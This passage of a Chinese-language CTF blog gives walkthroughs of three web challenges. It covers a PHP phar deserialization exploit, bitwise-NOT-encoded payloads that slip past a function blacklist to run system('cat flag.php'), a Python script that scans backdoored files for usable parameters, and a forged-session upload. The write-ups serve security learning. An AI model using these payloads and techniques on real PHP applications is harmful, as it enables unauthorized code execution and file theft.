    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> db <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>剩下的流程就是抓包传test.phar，改个Content-Type成png，上传成功；之后在delete页面filename传参phar://test.png得到flag。</p>
<p><a href="https://imgchr.com/i/0GJZJP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0GJZJP.png" srcset="/img/loading.gif" alt="0GJZJP.png"></a></p>
<h1 id="2020-第五空间智能安全大赛-Web-hate-php"><a href="#2020-第五空间智能安全大赛-Web-hate-php" class="headerlink" title="2020-第五空间智能安全大赛-Web-hate-php"></a>2020-第五空间智能安全大赛-Web-hate-php</h1><p><a href="https://imgchr.com/i/0G0ozn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0G0ozn.png" srcset="/img/loading.gif" alt="0G0ozn.png"></a></p>
<p>可以看见先是用preg_match对参数code做了很多过滤，</p>
<p>后面又用到</p>
<pre><code> $blacklist = get_defined_functions()[&#39;internal&#39;];</code></pre><p>把内置函数加到黑名单里了。</p>
<p>抓了个包看到PHP/7.4.5，php7后可以用  <strong>($a)();</strong> 这种方式执行动态函数。</p>
<p>如</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'phphinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出</span>
<span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span></code></pre>
<p>payload：?code = (~%8F%97%8F%96%91%99%90)()</p>
<p>就能读到phpinfo。</p>
<p>结合取反构造exp:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'print_r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'scandir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//payload:  ?code=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((~%D1)))</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出</span>
<span class="token comment" spellcheck="true">//payload:  ??code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)</span></code></pre>
<h1 id="强网杯-2019-Web-高明的黑客"><a href="#强网杯-2019-Web-高明的黑客" class="headerlink" title="强网杯-2019-Web-高明的黑客"></a>强网杯-2019-Web-高明的黑客</h1><p>题目一上来给了网站的/src源码，三千多个文件；</p>
<p>文件中有很多可利用函数，但需要寻找能正常传参的文件及参数。</p>
<p>#整体思路：先一次性发起请求测试哪些文件的GET和POST的传参是可用的，再在这基础上区分是POST还是GET。<br>这样的思路加多线程可以很好的节约时间。</p>
<p>参考：<a href="https://blog.csdn.net/a3320315/article/details/102945940" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940</a></p>
<p>具体脚本如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
s1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>                             
filePath <span class="token operator">=</span> r<span class="token string">"D:\phpstudy_pro\WWW\src"</span>
os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#改变当前的路径</span>
requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">10</span>                  <span class="token comment" spellcheck="true">#设置重连次数</span>
files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#返回path内全部文件及目录名的数组</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>  

<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span><span class="token operator">+</span>file<span class="token operator">+</span> <span class="token string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#提取所有的$_GET和$_POST的参数</span>
            gets <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            posts <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">#POST</span>
    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">#GET</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'echo("dwm2");'</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'echo("dwm2");'</span>
    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/src/'</span><span class="token operator">+</span>file                      
    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#一次性请求所有的GET和POST的方法</span>
    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                              
    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    <span class="token comment" spellcheck="true">#print(content)  </span>
    <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>          
        flag <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token string">'echo("dwm2");'</span><span class="token punctuation">)</span>
            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
            <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                flag <span class="token operator">=</span> <span class="token number">1</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token string">'echo("dwm2");'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
                <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#flag用来判断参数是GET还是POST</span>
            param <span class="token operator">=</span> <span class="token string">"get-"</span><span class="token operator">+</span>a
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            param <span class="token operator">=</span> <span class="token string">"post-"</span><span class="token operator">+</span>b
        end <span class="token operator">=</span> <span class="token string">"文件："</span><span class="token operator">+</span>file<span class="token operator">+</span><span class="token string">"参数："</span><span class="token operator">+</span>param
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span> 

    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>                                                         <span class="token comment" spellcheck="true">#多线程</span>
    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>跑完得到结果</p>
<p><a href="https://imgchr.com/i/0JFpOU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0JFpOU.png" srcset="/img/loading.gif" alt="0JFpOU.png"></a></p>
<p>直接传参得到flag。</p>
<p><a href="https://imgchr.com/i/0JknCn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0JknCn.png" srcset="/img/loading.gif" alt="0JknCn.png"></a></p>
<h1 id="2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload"><a href="#2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload" class="headerlink" title="2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload"></a>2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload</h1><p> <strong>考点：session,代码审计</strong></p>
<p>直接给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string">"/var/babyctf/"</span><span class="token punctuation">.</span><span class="token variable">$attr</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//文件夹路径</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token operator">===</span><span class="token string">"private"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$dir_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//路径为/var/babyctf/private/username</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//判断文件是否是通过 HTTP POST 上传的</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename</span>
        <span class="token variable">$file_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename_sha256(tmp_name)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string">"uploaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> 


<span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Length: '</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string">"downloaded"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>分析代码，得到flag的条件为session的username为admin且success,txt存在。</p>
<p>而且检测success.txt的file_exists()函数的特点意味着我们建立一个同名文件夹也可以满足条件。</p>
<p><a href="https://imgchr.com/i/0aTfpD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTfpD.png" srcset="/img/loading.gif" alt="0aTfpD.png"></a></p>
<p>三个传参，direction控制文件上传和下载；attr为新建文件夹名；filename为读取的文件名。</p>
<p>先抓个包看一下session以及它文件中的内容：</p>
<p><a href="https://imgchr.com/i/0aTKfS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTKfS.png" srcset="/img/loading.gif" alt="0aTKfS.png"></a></p>
<p><a href="https://imgchr.com/i/0aTYT0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTYT0.png" srcset="/img/loading.gif" alt="0aTYT0.png"></a></p>
<p>这个格式的序列化是php_binary引擎。</p>
<p>综上，大概思路就是：上传一个伪装成admin的session文件，再创建一个名为sucess,txt的文件夹即可满足条件。</p>
<p>重点代码</p>
<pre class=" language-php"><code class="language-php">        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename</span>

        <span class="token variable">$file_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename_sha256(tmp_name)</span></code></pre>
<p>也就是说，我们这里让伪造成admin的session文件命名为sess进行上传。</p>
<p>然后用脚本求出hash,并改动PHPSESSID就可以达成第一个条件。</p>
<p><a href="https://imgchr.com/i/0aLnxO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aLnxO.png" srcset="/img/loading.gif" alt="0aLnxO.png"></a></p>
<p>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p>用postman进行上传</p>
<p><a href="https://imgchr.com/i/0dPwa8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dPwa8.png" srcset="/img/loading.gif" alt="0dPwa8.png"></a></p>
<p>验证一下，已经传上去了</p>
<p><a href="https://imgchr.com/i/0dPbs1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dPbs1.png" srcset="/img/loading.gif" alt="0dPbs1.png"></a></p>
<p>现在再给attr传success.txt创建文件夹；</p>
<p><a href="https://imgchr.com/i/0dinzj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dinzj.png" srcset="/img/loading.gif" alt="0dinzj.png"></a></p>
<p>bp这边改下session，得到flag。</p>
